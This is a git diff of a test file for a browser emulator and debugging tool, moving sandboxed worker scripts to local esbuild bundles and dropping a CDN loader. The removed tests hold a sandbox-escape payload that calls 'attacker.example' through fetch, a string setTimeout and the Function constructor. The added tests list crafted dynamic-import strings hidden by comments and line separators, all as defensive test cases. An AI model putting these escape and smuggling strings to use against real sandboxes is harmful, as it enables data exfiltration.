@@ -2,6 +2,8 @@ import test from "node:test";
 import assert from "node:assert/strict";
 import vm from "node:vm";
 import { readFile } from "node:fs/promises";
+import { fileURLToPath } from "node:url";
+import * as esbuild from "esbuild";
 import { createMcpResponder } from "../src/mcp-responder.js";
 import { createOperationManager } from "../src/operation-manager.js";
 import { createInputSequenceService } from "../src/input-service.js";
@@ -21,15 +23,27 @@ import { createDebuggerService } from "../src/debugger-service.js";
 import { registerWebMcp } from "../src/webmcp.js";
 import { unwrapLegacyScalar } from "../src/legacy-scalar.js";
 import { withInternalMetadata } from "../src/internal-command-metadata.js";
-import { containsDynamicImport } from "../src/script-source-policy.js";
+import { assertSafeScriptSource, containsDynamicImport } from "../src/script-source-policy.js";
 import { createScriptRunner } from "../src/script-runner.js";
 import { createScreenInvalidNotice, SCREEN_INVALID_NOTICE } from "../src/screen-invalid-notice.js";
 import { createScriptCommands } from "../src/commands/script-commands.js";
 import { createContextCommands } from "../src/commands/context-commands.js";
-import { createAlgorithmLoader } from "../src/algorithm-loader.js";
 
 const responder = createMcpResponder({ logger: {} });
 const FRAMEBUFFER_BYTES = 256 * 384 * 4;
+const workerBundles = new Map();
+
+async function bundledWorkerSource(relativeUrl) {
+    const entryPoint = fileURLToPath(new URL(relativeUrl, import.meta.url));
+    if (!workerBundles.has(entryPoint)) {
+        const result = await esbuild.build({
+            entryPoints: [entryPoint], bundle: true, write: false, minify: false,
+            platform: "browser", format: "iife", target: ["chrome120"], logLevel: "silent"
+        });
+        workerBundles.set(entryPoint, result.outputFiles[0].text);
+    }
+    return workerBundles.get(entryPoint);
+}
 
 function memoryStorage() {
     const values = new Map();
@@ -40,7 +54,7 @@ function memoryStorage() {
 }
 
 async function runEvalSandbox(code) {
-    const source = await readFile(new URL("../src/workers/eval.worker.js", import.meta.url), "utf8");
+    const source = await bundledWorkerSource("../src/workers/eval.worker.js");
     const messages = [];
     const listeners = new Map();
     let networkCalls = 0;
@@ -85,8 +99,8 @@ async function runEvalSandbox(code) {
     return { messages, networkCalls, storageCalls };
 }
 
-async function runAlgorithmSandbox(librarySource) {
-    const source = await readFile(new URL("../src/workers/algorithm.worker.js", import.meta.url), "utf8");
+async function runAlgorithmSandbox() {
+    const source = await bundledWorkerSource("../src/workers/algorithm.worker.js");
     const messages = [];
     let networkCalls = 0;
     let storageCalls = 0;
@@ -130,12 +144,11 @@ async function runAlgorithmSandbox(librarySource) {
     context.onmessage({
         data: {
             type: "compare",
-            width: 1,
+            width: 16,
             screen: "top",
-            region: [0, 0, 1, 1],
-            baseline: new Uint32Array([0]),
-            current: new Uint32Array([0]),
-            librarySource
+            region: [0, 0, 16, 16],
+            baseline: new Uint32Array(16 * 192),
+            current: new Uint32Array(16 * 192)
         }
     });
     return { messages, networkCalls, storageCalls };
@@ -248,7 +261,7 @@ test("WebMCP relies on the native browser API without a global third-party scrip
     assert.match(api, /## Local security context/);
     assert.match(api, /event\.origin === window\.location\.origin/);
     assert.match(api, /localStorage.*sessionStorage/);
-    assert.match(api, /SHA-256/);
+    assert.match(api, /No executable source is fetched from a CDN at runtime/);
 });
 
 test("WebMCP prefers document.modelContext and accepts duplicate native registrations after reload", async () => {
@@ -302,7 +315,7 @@ test("WebMCP prefers document.modelContext and accepts duplicate native registra
         assert.match(injectedContext, /ROM, save, and state bytes are not uploaded/);
         assert.match(injectedContext, /cross-origin and opaque-origin message calls are ignored/);
         assert.match(injectedContext, /localStorage, sessionStorage, IndexedDB, Cache API/);
-        assert.match(injectedContext, /exact-version SHA-256 verified/);
+        assert.match(injectedContext, /Exact-version Acorn and SSIM dependencies are bundled locally/);
     } finally {
         for (const name of ["window", "navigator", "document"]) {
             if (previous[name]) Object.defineProperty(globalThis, name, previous[name]);
@@ -311,47 +324,25 @@ test("WebMCP prefers document.modelContext and accepts duplicate native registra
     }
 });
 
-test("external comparison code is hash-pinned before it reaches the sandbox", async () => {
-    const requests = [];
-    const loader = createAlgorithmLoader({
-        responder,
-        fetchImpl: async (url, options) => {
-            requests.push({ url, options });
-            return { ok: true, arrayBuffer: async () => new Uint8Array([1, 2, 3]).buffer };
-        },
-        cryptoImpl: { subtle: { digest: async () => new Uint8Array(32).buffer } }
-    });
-    const result = await loader.load("ssim-trim");
-    assert.equal(result.ok, false);
-    assert.equal(result.error.code, "ALGORITHM_INTEGRITY_FAILED");
-    assert.equal(requests.length, 1);
-    assert.match(requests[0].url, /^https:\/\/cdn\.jsdelivr\.net\/npm\/ssim\.js@3\.5\.0\//);
-    assert.equal(requests[0].options.credentials, "omit");
-    assert.equal(requests[0].options.referrerPolicy, "no-referrer");
+test("comparison dependencies are exact-version local bundles with no runtime CDN", async () => {
+    const packageJson = JSON.parse(await readFile(new URL("../package.json", import.meta.url), "utf8"));
+    const lock = JSON.parse(await readFile(new URL("../package-lock.json", import.meta.url), "utf8"));
+    const html = await readFile(new URL("../public/index.html", import.meta.url), "utf8");
+    const appSource = await readFile(new URL("../src/app.js", import.meta.url), "utf8");
+    assert.equal(packageJson.dependencies.acorn, "8.17.0");
+    assert.equal(packageJson.dependencies["ssim.js"], "3.5.0");
+    assert.equal(lock.packages["node_modules/acorn"].version, "8.17.0");
+    assert.equal(lock.packages["node_modules/ssim.js"].version, "3.5.0");
+    assert.doesNotMatch(html, /cdn\.jsdelivr|https:\/\/[^"']+\.js/i);
+    assert.doesNotMatch(appSource, /createAlgorithmLoader|algorithm-loader/);
 });
 
-test("external comparison sandbox blocks network, message forgery, storage, and code-generation escape", async () => {
-    const result = await runAlgorithmSandbox(`
-        for (const name of [
-            "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Worker", "SharedWorker", "importScripts",
-            "BroadcastChannel", "WebTransport", "indexedDB", "caches", "localStorage", "sessionStorage",
-            "close", "navigator"
-        ]) {
-            try {
-                const capability = globalThis[name];
-                if (typeof capability === "function") capability("https://attacker.example/leak");
-            } catch {}
-        }
-        try { globalThis.postMessage({ type: "done", result: { pct: 100, debug: { forged: true } } }); } catch {}
-        try { setTimeout('fetch("https://attacker.example/timer")', 0); } catch {}
-        try { ({}).constructor.constructor('fetch("https://attacker.example/constructor")')(); } catch {}
-        globalThis.ssim = { ssim: () => ({ mssim: 1 }) };
-    `);
+test("locally bundled comparison sandbox uses no network or storage capability", async () => {
+    const result = await runAlgorithmSandbox();
     assert.equal(result.networkCalls, 0);
     assert.equal(result.storageCalls, 0);
     assert.deepEqual(result.messages.map((message) => message.type), ["ready", "done"]);
     assert.equal(result.messages[1].result.pct, 0);
-    assert.equal(result.messages[1].result.debug.forged, undefined);
 });
 
 test("opaque and cross-origin contexts cannot use the message bridge to dump arbitrary ROM data", async () => {
@@ -1125,12 +1116,21 @@ test("next-branch stepping safely leaves current exec breakpoint for step and st
 test("script source policy rejects comment-separated and templated dynamic imports", () => {
     for (const source of [
         'import("https://example.com/module.js")',
+        'let x = 1, y = 1; x++ / import("./x.js") / y',
+        'let x = 1, y = 1; x-- / import("./x.js") / y',
+        '// hidden\rimport("./x.js")',
+        '// hidden\u2028import("./x.js")',
+        '// hidden\u2029import("./x.js")',
         'import/**/("https://example.com/module.js")',
         'import /* split */ ("https://example.com/module.js")',
         'import<!-- split\n("https://example.com/module.js")',
         'const value = `${import/**/("https://example.com/module.js")}`'
     ]) {
-        assert.equal(containsDynamicImport(source), true, source);
+        assert.throws(
+            () => assertSafeScriptSource(source),
+            (error) => error?.mcpCode === "SCRIPT_SOURCE_INVALID",
+            source
+        );
     }
     for (const source of [
         '"import(\\"https://example.com\\")"',
@@ -1236,7 +1236,7 @@ async function runPersistentScalarSandbox(
     code = 'const lr = await memory.reg("r14", "arm9"); const seed = await memory.read32(0x02385f0c, "arm9"); print(lr, seed);',
     replies = [0x02075628, 0x12345678]
 ) {
-    const source = await readFile(new URL("../src/workers/persistent-script.worker.js", import.meta.url), "utf8");
+    const source = await bundledWorkerSource("../src/workers/persistent-script.worker.js");
     const messages = [];
     const listeners = new Map();
     let networkCalls = 0;
@@ -1336,8 +1336,8 @@ test("persistent sandbox blocks network, message forgery, storage, and code-gene
     ]);
 });
 
-test("Ctable script registers hooks, prints numeric seeds, and resumes after exec callback", async () => {
-    const workerSource = await readFile(new URL("../src/workers/persistent-script.worker.js", import.meta.url), "utf8");
+test("Ctable script registers hooks and lets the coordinator resume after callbacks", async () => {
+    const workerSource = await bundledWorkerSource("../src/workers/persistent-script.worker.js");
     const ctableSource = await readFile(new URL("../scripts/dq9/Ctable_jp.js", import.meta.url), "utf8");
     const messages = [];
     const listeners = new Map();
@@ -1403,14 +1403,14 @@ test("Ctable script registers hooks, prints numeric seeds, and resumes after exe
         eventDone = messages.some((message) => message.type === "eventDone" && message.eventId === 77);
     }
     assert.equal(eventDone, true);
-    assert.ok(messages.some((message) => message.type === "call" && message.command === "resume" && message.eventId === 77));
+    assert.equal(messages.some((message) => message.type === "call" && message.command === "resume"), false);
     const callbackPrint = messages.filter((message) => message.type === "print").flatMap((message) => message.values.map(String));
     assert.ok(callbackPrint.some((value) => value.includes("lr 0x11111111")));
     assert.equal(callbackPrint.some((value) => value.includes("[object Object]")), false);
 });
 
 test("overlay script registers load/unload/tick hooks and reports overlay transitions", async () => {
-    const workerSource = await readFile(new URL("../src/workers/persistent-script.worker.js", import.meta.url), "utf8");
+    const workerSource = await bundledWorkerSource("../src/workers/persistent-script.worker.js");
     const overlaySource = await readFile(new URL("../scripts/dq9/overlay_jp.js", import.meta.url), "utf8");
     const messages = [];
     const listeners = new Map();
@@ -1437,7 +1437,6 @@ test("overlay script registers load/unload/tick hooks and reports overlay transi
         if (request.command === "memoryGetRegister") {
             return { ok: true, value: request.params.register === "r0" ? 2 : 0x11111111 };
         }
-        if (request.command === "resume") return { ok: true };
         throw new Error(`unexpected overlay request: ${request.command || request.type}`);
     };
     let handled = 0;
@@ -1498,7 +1497,7 @@ test("overlay script registers load/unload/tick hooks and reports overlay transi
     assert.ok(allPrint.includes("overlay loaded: slot 3, id 2, start 0x02000000, caller: 0x11111111"));
     assert.ok(allPrint.includes("overlay unloaded: slot 0x00000003, id 2"));
     assert.ok(allPrint.includes("overlay log disabled"));
-    assert.equal(messages.filter((message) => message.type === "call" && message.command === "resume").length, 2);
+    assert.equal(messages.some((message) => message.type === "call" && message.command === "resume"), false);
     assert.equal(messages.some((message) => message.type === "failed"), false);
 });
 
@@ -1527,7 +1526,7 @@ async function runEvalSupervisor(childMessage) {
     listener = context.onmessage;
     listener({ data: { type: "run", code: "return 1", sandboxSource: "sandbox", shortcuts: [] } });
     const child = workers[0];
-    child.onmessage({ data: { type: "ready", channelToken: "secret" } });
+    child.onmessage({ data: { type: "ready", hardened: true, layer: "sandbox", channelToken: "secret" } });
     child.onmessage({ data: childMessage });
     return { messages, child };
 }
@@ -1561,7 +1560,7 @@ test("persistent supervisor gates replies and rejects forged child messages", as
     vm.runInContext(source, context, { filename: "persistent-script-supervisor.worker.js" });
     context.onmessage({ data: { type: "start", code: "return 1", sandboxSource: "sandbox", shortcuts: [] } });
     const child = workers[0];
-    child.onmessage({ data: { type: "ready", channelToken: "secret" } });
+    child.onmessage({ data: { type: "ready", hardened: true, layer: "sandbox", channelToken: "secret" } });
     child.onmessage({ data: { type: "call", id: "request-1", command: "status", params: {}, channelToken: "secret" } });
     assert.ok(messages.some((message) => message.type === "call" && message.id === "request-1"));
     context.onmessage({ data: { replyId: "request-1", result: { ok: true } } });
@@ -1576,12 +1575,17 @@ test("persistent supervisor gates replies and rejects forged child messages", as
 test("all supervisor and sandbox Worker sources parse as classic scripts", async () => {
     for (const path of [
         "../src/workers/eval-supervisor.worker.js",
+        "../src/workers/persistent-script-supervisor.worker.js"
+    ]) {
+        const source = await readFile(new URL(path, import.meta.url), "utf8");
+        assert.doesNotThrow(() => Function(source), path);
+    }
+    for (const path of [
         "../src/workers/eval.worker.js",
-        "../src/workers/persistent-script-supervisor.worker.js",
         "../src/workers/persistent-script.worker.js",
         "../src/workers/algorithm.worker.js"
     ]) {
-        const source = await readFile(new URL(path, import.meta.url), "utf8");
+        const source = await bundledWorkerSource(path);
         assert.doesNotThrow(() => Function(source), path);
     }
 });
